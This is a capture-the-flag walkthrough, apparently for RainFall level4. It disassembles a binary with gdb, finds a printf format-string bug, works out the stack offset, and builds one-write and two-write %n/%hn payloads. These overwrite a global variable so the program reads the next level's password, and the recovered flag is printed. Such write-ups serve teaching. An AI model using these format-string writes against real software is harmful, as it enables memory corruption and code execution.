#+title: Walkthrough
* Data Gathering
** Strings
#+begin_src shell
readelf -p.rodata level4

String dump of section '.rodata':
  [     8]  /bin/cat /home/user/level5/.pass
#+end_src
** Functions
#+begin_src shell
 gdb ./level4 -batch -ex "info functions" -ex "info variables"
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  p
0x08048457  n
0x080484a7  main
0x080484c0  __libc_csu_init
0x08048530  __libc_csu_fini
0x08048532  __i686.get_pc_thunk.bx
0x08048540  __do_global_ctors_aux
0x0804856c  _fini
#+end_src

** Global variables
#+begin_src shell
All defined variables:

Non-debugging symbols:
0x08048588  _fp_hw
0x0804858c  _IO_stdin_used
0x080486f8  __FRAME_END__
0x080496fc  __CTOR_LIST__
0x080496fc  __init_array_end
0x080496fc  __init_array_start
0x08049700  __CTOR_END__
0x08049704  __DTOR_LIST__
0x08049708  __DTOR_END__
0x0804970c  __JCR_END__
0x0804970c  __JCR_LIST__
0x08049710  _DYNAMIC
0x080497dc  _GLOBAL_OFFSET_TABLE_
0x080497fc  __data_start
0x080497fc  data_start
0x08049800  __dso_handle
0x08049804  stdin@@GLIBC_2.0
0x08049808  completed.6159
0x0804980c  dtor_idx.6161
0x08049810  m
#+end_src

* Binary Analisis
** Functions
#+begin_src shell
gdb ./level4 -batch -ex "set disassembly-flavour intel" -ex 'disassemble main'  -ex 'disassemble n'  -ex 'disassemble p'
No symbol table is loaded.  Use the "file" command.
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   %ebp
   0x080484a8 <+1>:	mov    %esp,%ebp
   0x080484aa <+3>:	and    $0xfffffff0,%esp
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave  
   0x080484b3 <+12>:	ret    
End of assembler dump.
Dump of assembler code for function n:
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp
   0x08048460 <+9>:	mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
End of assembler dump.
Dump of assembler code for function p:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x8(%ebp),%eax
   0x0804844d <+9>:	mov    %eax,(%esp)
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret    
End of assembler dump.
#+end_src
[[source]]
** Get offset
*** Test offset to buffer
#+begin_src shell
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
#+end_src
*** Output
#+begin_src shell
AAAA0xb7ff26b00xbffffc840xb7fd0ff4(nil)(nil)0xbffffc480x804848d0xbffffa400x2000xb7fd1ac00xb7ff37d00x414141410x702570250x702570250x702570250x702570250x70257025
#+end_src
look likes the 12/3 is the nbr of ptr to reach the begin of buffer.
*** Verify the offset
#+begin_src shell
AAAA%12$p%13$p
AAAA0x414141410x24323125
#+end_src
the begin of the offset start at 12 position.
** Techniques:
modify m global var to get this value
m va = 0x08049810;
m value = $0x1025544
Two way on write or 2 writes.
*** 1 Write
#+begin_src shell
m value = 0x1025544 -> 16930116 - 4(size of m va) -> 16930112
m va = 0x08049810;
#+end_src
**** Explotation idea
string "[m_va]%16930116d%12$n"
#+begin_src shell
python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d%12$n"'
#+end_src
*** 2 Write
**** Values to copy
***** Higher int16
#+begin_src shell
(gdb) p 0x1025544 >> 16 & 0xffff
$9 = 258
#+end_src
***** Lower int16
#+begin_src shell
(gdb) p 0x1025544 & 0xFFFF
$10 = 21828
#+end_src
**** Va to copy
***** Higher va
#+begin_src shell
hmva=0x08049812
#+end_src
***** Lower va
#+begin_src shell
hmva=0x08049810
#+end_src
**** New Feature 
some system got a modier ~hn~ that write in half an integer in this case could make the exploit write less and get a faster access.
**** Explotation math
#+begin_src shell
m_val_h = 258 - 8  = 250.
m_val_l = 21828 - 258 = 21570
m_va_h = \x08\x04\x98\x12
m_va_l = \x08\x04\x98\x10
 
string "[m_va_h][m_va_l]%250d%12$hn%21570d%13$hn"
#+end_src
**** Explotation execution
#+begin_src shell
  python -c 'print "\x08\x04\x98\x12"[::-1] + "\x08\x04\x98\x10"[::-1] +  "%250d%12$hn%21570d%13$hn"'
#+end_src

* Explotation
** 1 Write
#+begin_src shell
[padding]-1208015184
#content of /home/user/level5/.pass
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
level4@RainFall:~$ python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d%12$n"' | ./level4 
#+end_src
** 2 Write
#+begin_src shell
[padding]-1073743980
#content of /home/user/level5/.pass
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
#+end_src
